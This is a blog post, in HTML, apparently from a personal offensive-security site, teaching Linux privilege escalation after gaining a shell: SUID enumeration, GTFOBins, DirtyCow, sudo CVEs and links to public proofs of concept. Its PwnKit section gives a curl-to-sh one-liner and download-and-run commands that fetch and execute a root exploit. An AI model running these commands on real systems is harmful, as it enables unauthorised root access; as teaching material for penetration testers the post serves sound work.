<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post-Exploitation: Shells are just the beginning (Part 1) - gotr00t Security Blog</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(45deg, #000000, #0a0a0a, #111111);
            color: #ffffff;
            font-family: 'Share Tech Mono', monospace;
            line-height: 1.8;
            min-height: 100vh;
        }

        /* Animated binary background */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.15) 1px, transparent 0);
            background-size: 20px 20px;
            animation: binaryFlow 10s linear infinite;
            z-index: -1;
        }

        @keyframes binaryFlow {
            0% { transform: translateY(0); }
            100% { transform: translateY(20px); }
        }

        /* Navigation */
        .nav-header {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #ffffff;
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 20px rgba(255, 255, 255, 0.3);
        }

        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0 20px;
        }

        .nav-links {
            display: flex;
            gap: 30px;
            list-style: none;
        }

        .nav-link {
            color: #ffffff;
            text-decoration: none;
            padding: 12px 20px;
            border: 1px solid transparent;
            border-radius: 5px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .nav-link:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #ffffff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }

        .nav-link.active {
            background: rgba(255, 255, 255, 0.2);
            border-color: #ffffff;
            color: #ffffff;
        }

        .nav-link i {
            color: #ffffff;
            width: 16px;
            text-align: center;
        }

        /* Main content */
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 20px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            min-height: 100vh;
        }

        .terminal-prompt {
            color: #00ff00;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.2em;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #00ff00;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.8em;
            font-weight: 900;
            text-align: center;
            margin-bottom: 20px;
            color: #ffffff;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 3px;
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2em;
            font-weight: 700;
            margin: 30px 0 15px 0;
            color: #ffffff;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
        }

        h3 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5em;
            font-weight: 400;
            margin: 25px 0 10px 0;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            letter-spacing: 1px;
        }

        p {
            margin-bottom: 20px;
            color: #ffffff;
            font-size: 1.1em;
        }

        strong {
            color: #ffffff;
            font-weight: bold;
        }

        em {
            color: #cccccc;
            font-style: italic;
        }

        a {
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        a:hover {
            color: #ffffff;
            text-shadow: 0 0 10px #00ff00;
        }

        /* Code/command styling */
        code {
            background: rgba(255, 255, 255, 0.1);
            color: #00ff00;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Share Tech Mono', monospace;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        /* Pre-formatted code blocks */
        pre {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #ffffff;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Share Tech Mono', monospace;
            line-height: 1.4;
        }

        pre code {
            background: none;
            border: none;
            padding: 0;
            color: #00ff00;
        }

        /* Highlighted text */
        mark {
            background: rgba(255, 255, 255, 0.2);
            color: #00ff00;
            padding: 2px 6px;
            border-radius: 3px;
        }

        /* Lists */
        ol, ul {
            margin: 20px 0;
            padding-left: 30px;
        }

        ol li, ul li {
            margin-bottom: 10px;
            color: #ffffff;
            font-size: 1.1em;
        }

        /* Image styling */
        figure {
            margin: 30px 0;
            text-align: center;
        }

        figure img {
            max-width: 100%;
            height: auto;
            border: 2px solid #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }

        figure img:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
        }

        /* Conclusion section */
        .conclusion {
            border-top: 2px solid #ffffff;
            margin-top: 40px;
            padding-top: 30px;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .nav-links {
                gap: 15px;
                flex-wrap: wrap;
                justify-content: center;
            }

            .nav-link {
                padding: 10px 15px;
                font-size: 0.9em;
            }

            h1 {
                font-size: 2em;
            }

            h2 {
                font-size: 1.6em;
            }

            .container {
                padding: 20px 15px;
            }
        }
    </style>
</head>

<body>
    <!-- Navigation -->
    <nav class="nav-header">
        <div class="nav-container">
            <ul class="nav-links">
                <li><a href="../index.html" class="nav-link"><i class="fas fa-home"></i>Home</a></li>
                <li><a href="../poc.html" class="nav-link"><i class="fas fa-bug"></i>PoC</a></li>
                <li><a href="../projects.html" class="nav-link"><i class="fas fa-code"></i>Projects</a></li>
                <li><a href="../guides.html" class="nav-link"><i class="fas fa-book"></i>Guides</a></li>
                <li><a href="../blog.html" class="nav-link active"><i class="fas fa-pen-nib"></i>Blog</a></li>
                <li><a href="../contact.html" class="nav-link"><i class="fas fa-envelope"></i>Contact</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <div class="terminal-prompt">gotr00t@postexploit:~$</div>
        
        <h1>Post-Exploitation: Shells are just the beginning (Part 1)</h1>

        <h2>Privilege Escalation</h2>

        <p><strong><em>Introduction</em></strong></p>

        <p>This article assumes you already have a solid understanding of post exploitation, along with general experience in pen-testing and exploiting vulnerabilities. This series will focus on Linux/Unix systems and it will walk you through different techniques attackers use during the post-exploitation phase after gaining a shell on a system. We are going to start of with privilege escalation and the different techniques used to escalate privileges.</p>

        <p><strong><em>Understanding privilege escalation</em></strong></p>

        <p>Privilege escalation is a technique where attackers exploit flaws on the system like misconfigurations or vulnerabilities to escalate their privilege from a normal user to a higher level of permissions like root. In the majority of cases once an attacker gets root on a system is pretty much game over! But it's not always the case. You might come across systems with strong security like network segmentation and access control and so on. But from the attackers perspective gaining root is the holy grail.</p>

        <p><strong><em>Some techniques used to escalate privs</em></strong></p>

        <p>I will start by outlining a few common techniques used to escalate privileges, and then move on to the technical details of each one. Keep in mind that there are many ways to escalate privileges, I will only focus on a few of them.</p>

        <ol>
            <li>SUID</li>
            <li>Kernel vulnerabilities</li>
            <li>Sudo vulnerabilities</li>
        </ol>

        <p><strong><em>Lets understand a bit more about SUIDs</em></strong></p>

        <p>If you have used Linux or Nix systems before you might already be familiar with SUID. If not, here is the rundown. SUID (Set User ID) is a special permission that allows an executable to run with the privs of the owner that created the file. The primary purpose of SUID is to let certain users with low privs to execute certain tasks that require higher permissions.</p>

        <p><strong><em>How to find SUIDs</em></strong></p>

        <p>The Main command I use to find SUIDs is <code>find / -perm -u=s -type f 2&gt;/dev/null</code> lets brake this down so that you can have a better understanding about the command.</p>

        <p><mark>find /</mark></p>

        <p>Starts searching from the root directory (/) and recursively scans the entire filesystem.</p>

        <p><mark>-perm -u=s</mark></p>

        <p>Matches files with the SUID bit set on the user permission. The -u=s flag specifically checks for executables that run with the file owner's privileges.</p>

        <p><mark>-type f</mark></p>

        <p>Restricts the results to regular files, excluding directories, symlinks, and other file types.</p>

        <p><mark>2&gt;/dev/null</mark></p>

        <p>Redirects standard error output to /dev/null. This suppresses "Permission denied" and other error messages you would normally get when scanning protected directories.</p>

        <p>So what happens when we run this command? You will see something similar to this:</p>

        <figure><img src="../Images/SUIDs.png" alt="SUID binaries found on the system"/></figure>

        <p>At this point, you might be wondering how these can actually be exploited. This is where GTFOBins comes into play. GTFOBins is a curated database of Unix executables that can be abused to bypass security restrictions.</p>

        <p>For example, if you notice that pkexec is present on a system, you can look it up on GTFOBins:</p>

        <figure><img src="../Images/pkexec.png" alt="GTFOBins entry for pkexec"/></figure>

        <p>From here you can follow along to try and escalate your privs. <mark>FYI</mark>: There's also an exploit called PwnKit that can try to exploit pkexec.</p>

        <p><strong><em>A quick overview of PwnKit</em></strong></p>

        <p>Quickly exploit this vulnerability on vulnerable linux distros based on Ubuntu, Debian, Fedora and CentOS:</p>

        <pre><code>sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"</code></pre>

        <p><strong><em>Manual Exploitation</em></strong></p>

        <pre><code>curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
./PwnKit - interactive shell
./PwnKit 'id' - single command</code></pre>

        <h2>Kernel Vulnerabilities</h2>

        <p>Before we get into kernel vulnerabilities let's explain how the linux kernel functions. The linux kernel is basically the core of the Operating System, it sits between user space and the hardware. It manages resources and enforces security boundaries. Everything pretty much depends on the kernel to function, shells, services the desktop environment and so on.</p>

        <p>Let's get into some security aspects of the linux kernel. Security and access control in Linux are enforced primarily by the kernel. While user space tools provide interfaces for configuration and management, the kernel is the component that ultimately decides what actions are allowed or denied. Every permission check, isolation boundary, and security policy is evaluated at this level.</p>

        <p>We won't go too deep into the Linux kernel here, this is just a basic overview to help you understand the fundamentals before we move on to some kernel vulnerabilities.</p>

        <p><strong><em>DirtyCow</em></strong></p>

        <p>This is a classic Linux kernel vulnerability that showed up in a lot of old school Linux CTF machines. I've worked with it before, so I'll break down how it works, how it was exploited, and include a PoC.</p>

        <p>The name DirtyCow came about because linux uses a mechanism called Copy On Write (COW), this mechanism optimizes memory usage. Dirty COW exploited a flaw in how the kernel handled this process under specific timing conditions. Exploiting this vulnerability allowed anyone to gain root access on the system.</p>

        <p><strong><em>DirtyCow PoC</em></strong></p>

        <p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p>

        <p><strong><em>More details on the DirtyCow vulnerability</em></strong></p>

        <p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails">https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</a></p>

        <p><strong>kernelPWNED</strong></p>

        <p>I wrote this tool in C++ that automatically detects if your linux kernel is vulnerable to known priv escalation exploits. It detects Dirty Cow, Dirty Pipe, GameOverlay and CVE-2024-1086.</p>

        <p><a href="https://github.com/gotr00t0day/kernelpwned">https://github.com/gotr00t0day/kernelpwned</a></p>

        <h2>Sudo Vulnerabilities and Misconfigurations</h2>

        <p>What is sudo, anyway? Sudo allows permitted users to execute commands with elevated privileges, typically as root. This is important because it reduces direct use of the root account and limits exposure if a user account is compromised. Even though users can run specific commands as root, access is controlled, logged, and restricted, by providing a safer alternative to logging in as root.</p>

        <p>Most sudo vulnerabilities come from misconfigurations or flaws in sudo's implementation. One of these misconfigurations is overly broad permissions, this is poor scope control where certain users just have too much permissions increasing the risk of privilege access abused in unintended ways.</p>

        <p><strong><em>Vulnerabilities</em></strong></p>

        <p>Below are a few notable sudo vulnerabilities that have been discovered over time. We won't go too deep into each one, instead I'll list them with brief descriptions, PoC references, and relevant resources.</p>

        <p><mark>CVE-2021-3156 (Baron Samedit)</mark></p>

        <p>Reference: <a href="https://nvd.nist.gov/vuln/detail/cve-2021-3156">https://nvd.nist.gov/vuln/detail/cve-2021-3156</a></p>

        <p>PoC: <a href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p>

        <p><mark>CVE-2025-32463 (chroot bypass)</mark></p>

        <p>Reference: <a href="https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw">https://www.upwind.io/feed/cve-2025-32463-critical-sudo-chroot-privilege-escalation-flaw</a></p>

        <p>PoC: <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">https://github.com/pr0v3rbs/CVE-2025-32463_chwoot</a></p>

        <p><mark>sudoPWNED</mark></p>

        <p>This is a tool I made that detects vulnerable sudo versions on Unix systems. It can detect the sudo vulnerabilities mentioned above.</p>

        <p>PoC: <a href="https://github.com/gotr00t0day/sudopwned">https://github.com/gotr00t0day/sudopwned</a></p>

        <div class="conclusion">
            <h2>Conclusion</h2>

            <p>Getting a shell doesn't mean much by itself. It's just a foothold. What matters is what you do with it. Privilege escalation is where post exploitation really starts, and it usually has less to do with flashy exploits and more to do with understanding how the system is put together.</p>

            <p>Most of the techniques covered here exist because of misconfigurations, bad assumptions, or trust placed in the wrong places. Sudo rules that are too loose, files with the wrong permissions, unsafe environment handling, or even kernel bugs, all of these are opportunities created over time, not mistakes made in a single moment.</p>

            <p>The takeaway is that enumeration and awareness are everything. A shell gives you access, but knowledge gives you control.</p>

            <h1>HACKING FROM THE SHADOWS!</h1>
        </div>

    </div>

</body>
</html>
